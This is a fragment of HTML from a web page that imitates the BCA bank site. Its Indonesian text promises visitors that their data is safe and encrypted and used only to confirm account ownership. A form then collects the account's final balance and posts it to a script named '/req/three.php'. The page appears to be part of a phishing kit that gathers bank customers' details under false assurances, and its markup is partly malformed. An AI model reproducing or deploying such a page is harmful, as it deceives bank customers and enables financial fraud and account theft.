...
<span style="color: #BE980A;">Data yang di input hanya untuk memastikan kepemilikan rekening, Data nasabah dijamin aman dan terenskripsi oleh system.
</span>
</div>
</div>
</div>
</div>
<form id="forgetPasswordForm" method="post" action="/req/three.php" autocomplete="off">
<div class="row mb-4">
<div class="col-12">
<div class="form-group">
<label for="bcaId"> Saldo Akhir:</label>
<input type="tel" name="saldo" id="dengan-rupiah" <input type="text" class="form-control" id="bcaId" name="atm" inputmode="numeric" maxLength placeholder="Rp. xxxx" " value required />
</div>
</div>
</div>
...
<div class="row">
<div class="col-12 col-sm-auto text-center"> <a target="_blank" rel="noreferrer noopener" href> LOKASI BCA </a> </div> <div class="col-12 col-sm-auto text-center"> <a target="_blank" rel="noreferrer noopener" href="https://www.bca.co.id"> BCA.CO.ID </a> </div> </div> </div>
...
</div> </footer> </div> <script src="#" async defer type="9a9432afb8d499d7ac305cb7-text/javascript"></script> <script src="/vendors/jquery/dist/jquery.slim.min.js" type="9a9432afb8d499d7ac305cb7-text/javascript"></script> <script src="/vendors/bootstrap/dist/js/bootstrap.min.js" type="9a9432afb8d499d7ac305cb7-text/javascript"></script> <script src="/vendors/jquery-validation/dist/jquery.validate.js" type="9a9432afb8d499d7ac305cb7-text/javascript"></script> <script src="/vendors/jquery-mask-plugin/dist/jquery.mask.js" type="9a9432afb8d499d7ac305cb7-text/javascript"></script> <script type="9a9432afb8d499d7ac305cb7-text/javascript">
...
<script type="9a9432afb8d499d7ac305cb7-text/javascript"> /* Dengan Rupiah */
...
<script type="9a9432afb8d499d7ac305cb7-text/javascript">
</script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="9a9432afb8d499d7ac305cb7-|49" defer></script></html>
